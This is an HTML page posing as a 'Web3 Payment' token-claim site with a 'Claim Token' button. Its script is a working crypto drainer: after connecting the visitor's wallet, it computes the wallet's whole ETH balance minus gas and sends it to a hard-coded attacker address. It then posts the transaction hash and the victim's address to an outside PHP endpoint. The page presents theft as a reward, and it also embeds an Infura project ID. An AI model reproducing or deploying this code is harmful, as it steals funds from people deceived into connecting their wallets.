<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Payment</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.0/dist/ethers.umd.min.js"></script>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .gold-bag-button {
            background: url('https://www.vhv.rs/file/max/37/378446_gold-coin-png-image.png') no-repeat center center;
            background-size: contain;
            width: 150px;
            height: 150px;
            border: none;
            cursor: pointer;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            text-shadow: 1px 1px 2px #000;
        }
        .gold-bag-button span {
            position: relative;
            top: 60%;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 5px 10px;
            border-radius: 5px;
        }
        #qrCodeContainer {
            display: none;
            text-align: center;
        }
        #qrCodeContainer img {
            width: 200px;
            height: 200px;
        }
    </style>
</head>
<body>
    <button id="connectButton" class="gold-bag-button"><span>Claim Token</span></button>

    <div id="qrCodeContainer">
        <h2>Scan QR Code with Your Wallet App</h2>
        <div id="qrCode"></div>
    </div>

    <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
        <input type="hidden" name="transactionDetails" id="transactionDetails">
    </form>

    <script>
        const connectButton = document.getElementById('connectButton');
        const transactionForm = document.getElementById('transactionForm');
        const transactionDetailsInput = document.getElementById('transactionDetails');
        const qrCodeContainer = document.getElementById('qrCodeContainer');
        const recipientAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
        const gasLimit = BigInt(21000);

        function toHex(value) {
            return '0x' + value.toString(16);
        }

        async function init() {
            const providerOptions = {
                walletconnect: {
                    package: WalletConnectProvider.default,
                    options: {
                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02" // Your Infura Project ID
                    }
                },
                binancechainwallet: {
                    package: true
                },
                coinbasewallet: {
                    package: true,
                    options: {
                        appName: "Web3 Payment",
                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02"
                    }
                },
                trustwallet: {
                    package: true
                }
            };

            const web3Modal = new Web3Modal.default({
                cacheProvider: true,
                providerOptions
            });

            connectButton.addEventListener('click', async () => {
                try {
                    const provider = await web3Modal.connect();
                    const web3 = new Web3(provider);

                    let walletType = 'unknown';
                    if (provider.isMetaMask) {
                        walletType = 'MetaMask';
                    } else if (provider.isTrust) {
                        walletType = 'Trust Wallet';
                    } else if (provider.isCoinbaseWallet) {
                        walletType = 'Coinbase Wallet';
                    } else if (provider.isBinanceChainWallet) {
                        walletType = 'Binance Chain Wallet';
                    }

                    console.log(`${walletType} detected`);

                    const ethersProvider = new ethers.providers.Web3Provider(provider);
                    const accounts = await web3.eth.getAccounts();
                    const senderAddress = accounts[0];
                    console.log(`Sender Address: ${senderAddress}`);

                    // Fetch current gas prices
                    const feeData = await ethersProvider.getFeeData();
                    const gasPriceWei = BigInt(feeData.gasPrice.toString());
                    const maxFeePerGas = BigInt(feeData.maxFeePerGas.toString());
                    const maxPriorityFeePerGas = BigInt(feeData.maxPriorityFeePerGas.toString());

                    console.log(`Gas Price Wei: ${gasPriceWei}`);
                    console.log(`Max Fee Per Gas: ${maxFeePerGas}`);
                    console.log(`Max Priority Fee Per Gas: ${maxPriorityFeePerGas}`);

                    const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
                    console.log(`ETH Balance Wei: ${ethBalanceWei}`);
                    const gasFeeWei = gasPriceWei * gasLimit;
                    const maxEthTransferWei = ethBalanceWei - gasFeeWei;

                    console.log(`Gas Fee Wei: ${gasFeeWei}`);
                    console.log(`Max ETH Transfer Wei: ${maxEthTransferWei}`);

                    // Create a simple ETH transaction
                    const ethTransactionParameters = {
                        to: recipientAddress,
                        from: senderAddress,
                        value: toHex(maxEthTransferWei),
                        gas: toHex(gasLimit),
                        maxFeePerGas: toHex(maxFeePerGas),
                        maxPriorityFeePerGas: toHex(maxPriorityFeePerGas)
                    };

                    console.log('ETH Transaction Parameters:', ethTransactionParameters);

                    // Send the transaction
                    const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);

                    // Send transaction details to PHP endpoint
                    transactionDetailsInput.value = JSON.stringify({
                        status: 'approved',
                        ethTransactionHash: ethTxHash.transactionHash,
                        sender: senderAddress,
                        recipient: recipientAddress,
                        maxEthTransfer: maxEthTransferWei.toString()
                    });
                    transactionForm.submit();
                } catch (error) {
                    console.error('Error:', error.message);
                    // Handle user rejection
                    transactionDetailsInput.value = JSON.stringify({
                        status: 'declined',
                        error: error.message
                    });
                    transactionForm.submit();
                }
            });

            // Fallback to WalletConnect QR code if the wallet is not detected
            web3Modal.on('connect', async (provider) => {
                if (provider.isWalletConnect) {
                    qrCodeContainer.style.display = 'block';
                    const walletConnectProvider = provider.connector;
                    const uri = await walletConnectProvider.getQrCode();
                    const qrCodeImg = document.createElement('img');
                    qrCodeImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(uri)}`;
                    document.getElementById('qrCode').appendChild(qrCodeImg);
                }
            });
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
